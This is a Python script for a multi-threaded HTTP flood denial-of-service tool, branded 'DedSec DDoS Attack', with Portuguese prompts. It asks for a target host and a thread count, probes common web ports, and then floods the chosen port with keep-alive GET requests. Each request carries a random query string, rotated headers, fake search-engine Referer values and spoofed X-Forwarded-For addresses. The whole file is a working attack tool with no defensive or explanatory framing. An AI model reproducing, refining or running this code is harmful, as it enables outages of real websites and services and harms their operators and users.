import socket, threading, time, sys, random, os, signal
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

BOTS_REF = [
    "https://www.google.com/search?q=", "https://www.facebook.com/sharer/sharer.php?u=",
    "https://validator.w3.org/check?uri=", "https://check-host.net/check-report?host=",
    "https://www.bing.com/search?q=", "https://www.duckduckgo.com/?q="
]

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{Fore.GREEN}    ██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗
{Fore.GREEN}    ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝
{Fore.WHITE}    ██║  ██║█████╗  ██║  ██║███████╗█████╗  ██║     
{Fore.WHITE}    ██║  ██║██╔══╝  ██║  ██║╚════██║██╔══╝  ██║     
{Fore.GREEN}    ██████╔╝███████╗██████╔╝███████║███████╗╚██████╗
{Fore.GREEN}    ╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚══════╝ ╚═════╝
{Fore.WHITE}             DDoS ATTACK - ELITE INTELLIGENCE TOOL
    
{Fore.CYAN}    [+] Operation: DedSec_DDoS Attack | Mod: VertzDevSec
{Fore.CYAN}    [+] System: Multi-Threaded Bot-Referer Pipelining
{Fore.YELLOW}    ----------------------------------------------------------------------
    """)

def authenticate():
    show_banner()
    while True:
        u = input(f"{Fore.BLUE}ID: ").strip()
        p = input(f"{Fore.BLUE}PW: ").strip()
        if u == "dedsec" and p == "dedsec": break
        print(f"{Fore.RED}[!] Acesso Negado.")

def down_it(id_w, host, port, h_list):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(4)
            s.connect((host, int(port)))
            for _ in range(40):
                h = random.choice(h_list); b = random.choice(BOTS_REF)
                ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                packet = (f"GET /?{random.getrandbits(32)} HTTP/1.1\r\nHost: {host}\r\n{h}\r\n"
                          f"Referer: {b}{host}\r\nX-Forwarded-For: {ip}\r\nConnection: keep-alive\r\n\r\n").encode()
                s.sendall(packet)
            sys.stdout.write(f"\r{Fore.GREEN}[DEDSEC_{id_w:03d}] INUNDANDO -> {host}:{port} {Fore.WHITE}[BOTS ATIVOS]")
            sys.stdout.flush()
        except:
            sys.stdout.write(f"\r{Fore.RED}[DEDSEC_{id_w:03d}] ALVO SATURADO / TIMEOUT                     "); sys.stdout.flush()
            time.sleep(0.1)
        finally: s.close()

if __name__ == '__main__':
    authenticate(); show_banner()
    try:
        with open("headers.txt", "r") as f: h_list = [l.strip() for l in f.readlines() if l.strip()]
    except: h_list = ["User-Agent: Mozilla/5.0"]
    
    host = input(f"{Fore.CYAN}[?] Digite o IP/URL do Alvo: ").strip().replace("http://","").replace("https://","").split('/')[0]
    thr = int(input(f"{Fore.CYAN}[?] Quantidade de Threads: "))
    
    print(f"\n{Fore.YELLOW}[*] Escaneando portas comuns..."); ports = [80, 443, 8080]
    for p in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sock.settimeout(0.3)
        if sock.connect_ex((host, p)) == 0: print(f"{Fore.GREEN}[+] Porta {p} Aberta!")
        sock.close()
    
    port = int(input(f"\n{Fore.BLUE}[?] Selecione a porta para a operação: "))
    show_banner()
    print(f"{Fore.RED}[!] OPERAÇÃO INICIADA EM {host}:{port}\n")
    with ThreadPoolExecutor(max_workers=thr) as executor:
        for i in range(thr): executor.submit(down_it, i, host, port, h_list)
